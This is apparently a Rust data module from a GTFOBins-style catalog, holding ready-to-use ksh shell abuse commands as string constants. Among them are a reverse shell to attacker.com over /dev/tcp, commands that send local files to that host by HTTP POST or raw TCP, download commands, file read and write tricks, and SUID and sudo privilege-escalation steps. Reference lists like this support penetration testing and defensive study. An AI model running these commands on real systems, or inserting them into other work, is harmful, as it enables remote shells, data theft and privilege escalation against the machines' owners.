pub static BIN_NAME: &'static str = "ksh";
pub static SH_CODE: &'static str = r#"
    
    ksh
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
"#;
pub static FU_DESC_1: &'static str = "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.";
pub static FU_CODE_1: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_send
    ksh -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
"#;
pub static FU_DESC_2: &'static str = "Send local file using a TCP connection. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file.";
pub static FU_CODE_2: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_send
    ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
"#;
pub static FD_DESC_1: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE_1: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_get
    ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
        3<>/dev/tcp/$RHOST/$RPORT \
        | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
"#;
pub static FD_DESC_2: &'static str = "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < 'file_to_send'` on the attacker box to send the file.";
pub static FD_CODE_2: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    export LFILE=file_to_get
    ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
"#;
pub static FW_CODE: &'static str = r#"
    
    export LFILE=file_to_write
    ksh -c 'echo DATA > $LFILE'
"#;
pub static FR_DESC_1: &'static str = "It trims trailing newlines.";
pub static FR_CODE_1: &'static str = r#"
    
    export LFILE=file_to_read
    ksh -c 'echo "$(<$LFILE)"'
"#;
pub static FR_DESC_2: &'static str = "It trims trailing newlines.";
pub static FR_CODE_2: &'static str = r#"
    
    export LFILE=file_to_read
    ksh -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ksh) .

    ./ksh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo ksh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FU_1: Code<'static> = Code {
    title: "FU_CODE_1",
    code: FU_CODE_1,
    tag: Tag::FU,
};
pub static FU_2: Code<'static> = Code {
    title: "FU_CODE_2",
    code: FU_CODE_2,
    tag: Tag::FU,
};
pub static FD_1: Code<'static> = Code {
    title: "FD_CODE_1",
    code: FD_CODE_1,
    tag: Tag::FD,
};
pub static FD_2: Code<'static> = Code {
    title: "FD_CODE_2",
    code: FD_CODE_2,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR_1: Code<'static> = Code {
    title: "FR_CODE_1",
    code: FR_CODE_1,
    tag: Tag::FR,
};
pub static FR_2: Code<'static> = Code {
    title: "FR_CODE_2",
    code: FR_CODE_2,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
